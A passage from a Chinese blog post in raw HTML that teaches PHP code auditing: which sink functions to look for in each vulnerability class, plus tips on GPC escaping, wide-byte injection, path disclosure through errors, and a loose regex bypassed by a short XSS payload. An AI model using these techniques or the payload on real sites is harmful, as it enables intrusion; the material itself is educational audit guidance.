invoke__">where</span>()</span><br><span class="line"><span class="title function_ invoke__">find</span>()</span><br><span class="line"><span class="title function_ invoke__">select</span>()</span><br></pre></td></tr></table></figure><p>通过定位这些关键字，我们就能够定位到执行SQL语句的地方，然后去判断执行SQL语句中的参数是否采用了拼接SQL的方式，如果是则去判断是否存在参数过滤以及参数是否可控。</p><p>如果参数不可控，来源于某一条SQL语句查询出的结果，我们就需要重点关注这个参数是否来源于其他的用户输入，如果是，则需要考虑是否存在二次注入的情况。</p><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>xss漏洞需要重点关注输出函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span>()</span><br><span class="line"><span class="keyword">echo</span> </span><br><span class="line"><span class="title function_ invoke__">print_f</span>()</span><br><span class="line"><span class="keyword">die</span>()</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>()</span><br><span class="line"><span class="title function_ invoke__">print_r</span>()</span><br></pre></td></tr></table></figure><p>然后去判断输出的内容是否存在可控变量, 并检测这些变量在输入或者输出的时候是否采用了HTML实体编码, 或者是否对输入进行了过滤, 如果什么都没有, 在输出内容可控的情况下则很可能存在xss漏洞</p><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>可以尝试全局搜索</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">csrf-token</span><br><span class="line">csrf_token</span><br><span class="line">csrftoken</span><br><span class="line">csrf</span><br></pre></td></tr></table></figure><p>重点看一下是否在表单处存在随机token, 是否存在敏感操作的表单, 查看后端代码中是否会先验证这部分token, 如果没有验证token, 再进一步看看是否有refer的相关验证, 如果也没用就可能存在csrf</p><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>ssrf漏洞引发函数主要是能用于远程请求资源的一些函数, 像这些</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_content</span>()</span><br><span class="line"><span class="title function_ invoke__">curl</span>()</span><br><span class="line"><span class="title function_ invoke__">fopen</span>()</span><br><span class="line"><span class="title function_ invoke__">readline</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">get_headers</span>()</span><br></pre></td></tr></table></figure><p>再看是否限制了访问端口/协议/内网IP地址等</p><p>常见的漏洞场景:</p><ul><li>社交分享</li><li>转码服务</li><li>在线翻译</li><li>没有使用img标签的远程图片加载</li></ul><p>对于检测方法主要也是通过判断这些函数获取的url或者文件名是否可控, 如果可控, 则可能造成漏洞, 同时也容易造成上面提到的任意文件读取漏洞</p><p>利用<code>file://,http://,https://,dice://,gopher://</code>协议打内网</p><h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><p>需要关注的一些函数:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>()</span><br><span class="line"><span class="title function_ invoke__">assert</span>()</span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>()</span><br><span class="line"><span class="title function_ invoke__">array_map</span>()</span><br><span class="line"><span class="title function_ invoke__">call_user_funcn</span>()</span><br></pre></td></tr></table></figure><p>assert()函数在PHP中与eval类似，但是只能执行一行代码，在PHP7中则取消了该函数执行动态代码的功能，也就是说执行执行固定的代码了。</p><p>其他的代码执行函数，大多数为回调函数，具备了调用php代码的功能。</p><p>审计要素:</p><ul><li><code>php.ini</code>文件中的<code>disable_function</code>是否有禁用函数</li><li>是否存在可以diamagnetic执行的敏感函数</li><li>是否输入变量可控</li></ul><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br></pre></td></tr></table></figure><p>对于命令执行漏洞来说，主要还是存在于一些获取系统信息的地方，可能会通过执行命令的方式来获取，若果说执行的命令可控的话，则可能导致命令执行。</p><p>对于命令执行的其中几个方法，存在一定的差异：</p><ul><li>system()是执行系统命令并返回执行结果。</li><li>exec()则是执行命令后，返回一个结果句柄，并不直接返回结果。</li><li>shell_exec()则是执行不返回命令执行后的任何信息。</li></ul><p>在php中, 通过<code>&#123;&#125;</code>的方式同样能够执行代码, 同时还能通过动态拼接代码的方式来执行PHP代码. 通过使用双反引号的方式, 也能够同样做到等同于system的命令执行效果</p><h4 id="文件上传、删除、下载"><a href="#文件上传、删除、下载" class="headerlink" title="文件上传、删除、下载"></a>文件上传、删除、下载</h4><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><p>常见的业务有</p><ul><li>头像上传</li><li>备份文件上传</li><li>配置文件上传</li></ul><p>对于文件上传漏洞，需要关注的函数为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uplaod_file</span>()</span><br></pre></td></tr></table></figure><p>在审计的时候就只需要去搜欧索这一个函数，然后判断是否对文件上传的格式做限制，或者说是否可以绕过文件后缀限制。</p><p>如果说不能绕过的话，则需要去检测是否存在文件解析漏洞或者文件包含漏洞，然后进行绕过利用。</p><h5 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h5><p>对于文件删除漏洞，触发漏洞的函数同样只有一个，那就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unlink</span>()</span><br></pre></td></tr></table></figure><p>我们在审计的时候，判断文件名是否可控，同时检测是否允许文件命中存在路径穿越符，如果允许，则说明存在任意文件删除漏洞，危害较大。</p><h5 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h5><p>常见触发函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_content</span>()</span><br><span class="line"><span class="title function_ invoke__">fopen</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br><span class="line"><span class="title function_ invoke__">fread</span>()</span><br><span class="line"><span class="title function_ invoke__">file</span>()</span><br></pre></td></tr></table></figure><p>对于这种漏洞，可以在黑盒的情况下先去找文件读取和下载的的功能点，然后通过请求的URL去分析功能对应的具体代码，再来判断读取的文件，其文件名是否可控，是否允许文件名存在路径穿越符等。</p><p>如果存在漏洞的情况下，利用方法一时读取系统文件，而是读取网站源码，在读取的时候，我们可以使用php的伪协议来读取源码。</p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>常见触发函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br></pre></td></tr></table></figure><p>全局搜索, 然后一个个看, 查看变量可不可控</p><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>常见触发函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">simplexml_load_string</span>()</span><br><span class="line">DOMDocument</span><br><span class="line">SimpleXMLElement</span><br></pre></td></tr></table></figure><p>我们需要判断被解析的XML数据是否允许我们外部输入，并且是否允许代用外部实体，是否禁用了外部实体, 然后再进行详细的分析与利用</p><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>可以尝试全局搜索一下<code>serialize</code>, 重点关注下列几个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__construct：在创建对象时候初始化对象，一般用于对变量赋初值。</span><br><span class="line">__destruct：和构造函数相反，当对象所在函数调用完毕后执行。</span><br><span class="line">__call：当调用对象中不存在的方法会自动调用该方法。</span><br><span class="line"><span class="title function_ invoke__">__get</span>()：获取对象不存在的属性时执行此函数。</span><br><span class="line"><span class="title function_ invoke__">__set</span>()：设置对象不存在的属性时执行此函数。</span><br><span class="line">__toString：当对象被当做一个字符串使用时调用。</span><br><span class="line">__sleep：序列化对象之前就调用此方法(其返回需要一个数组)</span><br><span class="line">__wakeup：反序列化恢复对象之前调用该方法</span><br><span class="line"><span class="title function_ invoke__">__isset</span>()：在不可访问的属性上调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()触发</span><br><span class="line"><span class="title function_ invoke__">__unset</span>()：在不可访问的属性上使用<span class="keyword">unset</span>()时触发</span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() ：将对象当作函数来使用时执行此方法</span><br></pre></td></tr></table></figure><p>看看存不存在可控变量</p><h3 id="审计技巧总结"><a href="#审计技巧总结" class="headerlink" title="审计技巧总结"></a>审计技巧总结</h3><h4 id="GPC"><a href="#GPC" class="headerlink" title="GPC"></a>GPC</h4><p>简单介绍一下GPC, <code>magic_quotes_gpc</code>是<code>php.ini</code>里面的配置选项,在php5.2之前的版本默认开启, 在5.2-5.4之间的版本默认关闭, 5.4以后的版本直接取消了这一配置项</p><p>该配置项的作用就是对我们传入的POST, GET, COOKIE变量中的<code>&#39;</code>,<code>&quot;</code>,<code>\</code>,<code>NULL</code>等字符前加上<code>\</code>进行转义</p><p>在php中, 看其GPC的方法有两种, 一是在<code>php.ini</code>中配置<code>magic_quotes_gpc</code>选项的值为<code>on</code>, 还有一种就是在php代码中使用<code>get_magic_quotes_gpc()</code>函数判断是否开启该选项, 如果没有则使用<code>addslashes()</code>函数进行转义, 比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">get_magic_quotes_gpc</span>()) &#123;  <span class="comment">//magic_quotes_gpc 配置为 ON 则返回1，如果配置为OFF 则返回0</span></span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	.......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在php中, 我们提到了POST等变量会受到全局配置GPC的影响, 但是<code>$_SERVER</code>变量不会, 其中获取http头并不受到GPC保护, 如果说获取的HTTP头存在于数据库交互的行为, 则可能导致SQL注入</p><p>同时由于使用了GPC对特殊字符进行转义, 我们都知道宽字节注入的原理, 如果说在开启了GPC的情况下, 还设置了数据库编码为GBK模式, 则可能导致宽字节注入的存在, 在php中设置数据库编码的方式有以下两种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">方法<span class="number">1</span>： <span class="title function_ invoke__">mysqli_set_charset</span>(<span class="variable">$connnect</span>,<span class="string">&#x27;GBK&#x27;</span>)</span><br><span class="line">方法<span class="number">2</span>： <span class="title function_ invoke__">mysqli_query</span>(<span class="string">&quot;set names &#x27;gbk&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>这两种方法都能设置数据库的编码模式，在开启了GPC的情况下，就容易出现宽字节注入的问题。</p><h4 id="利用字符处理问题"><a href="#利用字符处理问题" class="headerlink" title="利用字符处理问题"></a>利用字符处理问题</h4><h5 id="利用字符处理函数报错"><a href="#利用字符处理函数报错" class="headerlink" title="利用字符处理函数报错"></a>利用字符处理函数报错</h5><p>在了解这个问题之前, 我们需要知道, 在php中, 报错信息分为多个等级, 可以通过配置<code>php.ini</code>的<code>display_error=on</code>或者在代码中使用<code>error_reporting()</code>来设置报错等级; 常见报错等级如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、E_ERROR             //致命的运行时错误。这类错误一般是不可恢复的情况，例如内存分配导致的问题。后果是导致脚本终止不再继续运行。</span><br><span class="line">2、E_WARNING          //运行时警告 (非致命错误)。仅给出提示信息，但是脚本不会终止运行。</span><br><span class="line">3、E_PARSE            //编译时语法解析错误。解析错误仅仅由分析器产生</span><br><span class="line">4、E_NOTICE           //运行时通知。</span><br><span class="line">5、E_USER_ERROR       //用户产生的错误信息。</span><br><span class="line">6、E_USER_WARNING     //用户产生的警告信息。</span><br><span class="line">7、E_USER_NOTICE</span><br><span class="line">8、E_STRICT           //启用 PHP 对代码的修改建议，以确保代码具有最佳的互操作性和向前兼容性。</span><br><span class="line">9、E_ALL              //E_STRICT除外的所有错误和警告信息。</span><br></pre></td></tr></table></figure><p>在PHP中，大多数的错误都会显示错误的文件路径与集体位置，在渗透测试中，经常会遇到上传或者写入webshell的的情况需要知道网站绝对路径，这时候我们就可以考虑使用PHP报错来获取网站路径。</p><p>对于PHP程序来说，大多数开发者都会使用<code>trim()</code>函数来去除参数首尾的空调，但是当我们传入的参数是一个数组的时候，比如<code>/index.php?a[]=test</code>,这时候如果采用<code>trim($_GET(&#39;a&#39;))</code> 来去除a参数的空格的话，就会导致程序报错。</p><p>类似的函数还有很多, 类似</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">addcslashes</span>()</span><br><span class="line"><span class="title function_ invoke__">bin2hex</span>()</span><br><span class="line"><span class="title function_ invoke__">chr</span>()</span><br><span class="line"><span class="title function_ invoke__">exho</span>()</span><br><span class="line"><span class="title function_ invoke__">explode</span>()</span><br><span class="line"><span class="title function_ invoke__">crypto</span>()</span><br><span class="line"><span class="title function_ invoke__">md5</span>()</span><br></pre></td></tr></table></figure><h5 id="利用字符串截断"><a href="#利用字符串截断" class="headerlink" title="利用字符串截断"></a>利用字符串截断</h5><p>字符串截断利用最多的则是在文件上传的时候，但是%00空字符即NULL，在开启了GPC的情况下会受到影响为不能正常利用。同时在PHP5.3以后，修复了这一问题，所以利用场景相对目前来比较少见。这里就只简单的提一下。</p><p>还有另外一种字符串截断情况, 就是使用了<code>iconv()</code>函数进行编码转换时, 比如<code>utf-8</code>转换为<code>gbk</code>编码, 总会存在一些差异, 导致转换出现乱码, 所以在使用了<code>iconv()</code>函数进行转换时, 如果出现了错误, 则会不再进行转换, 导致了字符串被截断的问题</p><p>有大佬测试了相关问题，发现在使用<code>iconv()</code>函数将UTF-8编码转为GBK编码的情况下，遇到cahr(128)—chr(255)之间的字符否存在被截断的可能。</p><h5 id="不严谨的正则表达式"><a href="#不严谨的正则表达式" class="headerlink" title="不严谨的正则表达式"></a>不严谨的正则表达式</h5><p>比如下面这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span>=<span class="variable">$_SERVER</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d+\.\d+\.\d+\.\d+/&#x27;</span>,<span class="variable">$ip</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$ip</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只需要在传入的payload以IP地址开头即可绕过, 像这样<code>127.0.0.1&lt;/scritp&gt;alert(xss)&lt;/scritp&gt;</code></p><p>文章参考:<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45590334/article/details/126517767">https://blog.csdn.net/qq_45590334/article/details/126517767<i class="fas fa-external-link-alt"></i></a></p></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/Web/">#Web</a>&nbsp;</li><li class="tag-item"><a href="/tags/Study/">#Study</a>&nbsp;</li><li class="tag-item"><a href="/tags/PHP/">#PHP</a>&nbsp;</li><li class="tag-item"><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#代码审计</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/2023/04/23/web10-pyweb-flaskssti-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">web10_pyweb+flaskssti+反序列化</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/2023/03/08/Python_Selenium%E5%AD%A6%E4%B9%A0/"><span class="title flex-center"><span class="post-nav-title-item">Python_Selenium_Study</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;Comments</div><div class="waline-comment-container"><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline-meta.css"><script src="//unpkg.com/@waline/client@v2/dist/waline.js"></script><div id="waline-comment"></div><script>function loadWaline(){Waline.init({el:"#waline-comment",serverURL:"https://waline-charmersix.vercel.app/",lang:"en",comment:".post-comments-count",reaction:!0})}window.addEventListener("DOMContentLoaded",loadWaline)</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%86%E8%A7%A3%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84"><span class="nav-number">1.</span> <span class="nav-text">了解系统架构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E4%BA%86%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6"><span class="nav-number">2.</span> <span class="nav-text">使用了开发框架</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#think-PHP"><span class="nav-number">2.1.</span> <span class="nav-text">think PHP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#laravel"><span class="nav-number">2.2.</span> <span class="nav-text">laravel</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6"><span class="nav-number">3.</span> <span class="nav-text">没有使用开发框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E8%BF%87%E6%BB%A4%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">参数过滤分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mvc%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E8%BF%87%E6%BB%A4%E6%83%85%E5%86%B5%E5%88%86%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">mvc模式下的过滤情况分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%94%9Fphp%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E8%BF%87%E6%BB%A4%E5%88%86%E6%9E%90"><span class="nav-number">4.2.</span> <span class="nav-text">原生php模式下的过滤分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E5%87%A0%E4%B8%AA%E9%A2%98"><span class="nav-number">5.</span> <span class="nav-text">做几个题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#301"><span class="nav-number">5.1.</span> <span class="nav-text">301</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#302"><span class="nav-number">5.2.</span> <span class="nav-text">302</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-number">5.2.1.</span> <span class="nav-text">写入一句话木马</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#303"><span class="nav-number">5.3.</span> <span class="nav-text">303</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#304"><span class="nav-number">5.4.</span> <span class="nav-text">304</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#305"><span class="nav-number">5.5.</span> <span class="nav-text">305</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#306"><span class="nav-number">5.6.</span> <span class="nav-text">306</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#307"><span class="nav-number">5.7.</span> <span class="nav-text">307</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#308"><span class="nav-number">5.8.</span> <span class="nav-text">308</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#309"><span class="nav-number">5.9.</span> <span class="nav-text">309</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#310"><span class="nav-number">5.10.</span> <span class="nav-text">310</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">常见漏洞审计方法总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">6.1.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS"><span class="nav-number">6.2.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF"><span class="nav-number">6.3.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF"><span class="nav-number">6.4.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">6.5.</span> <span class="nav-text">代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">6.6.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E5%88%A0%E9%99%A4%E3%80%81%E4%B8%8B%E8%BD%BD"><span class="nav-number">6.7.</span> <span class="nav-text">文件上传、删除、下载</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">6.7.1.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="nav-number">6.7.2.</span> <span class="nav-text">文件删除</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">6.7.3.</span> <span class="nav-text">文件写入</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">6.8.</span> <span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XXE"><span class="nav-number">6.9.</span> <span class="nav-text">XXE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">6.10.</span> <span class="nav-text">反序列化</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">审计技巧总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GPC"><span class="nav-number">7.1.</span> <span class="nav-text">GPC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98"><span class="nav-number">7.2.</span> <span class="nav-text">利用字符处理问题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99"><span class="nav-number">7.2.1.</span> <span class="nav-text">利用字符处理函数报错</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%88%AA%E6%96%AD"><span class="nav-number">7.2.2.</span> <span class="nav-text">利用字符串截断</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8D%E4%B8%A5%E8%B0%A8%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">7.2.3.</span> <span class="nav-text">不严谨的正则表达式</span></a></li></ol></li></ol></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2022.04.28</span> - 2023 &nbsp;<i class="fas fa-heart icon-animate"></i> &nbsp;<a href="/">Charmersix</a></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item">Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp; Totalview&nbsp;<span id="busuanzi_value_site_pv"></span></div><div class="theme-info info-item">Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a></div></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script 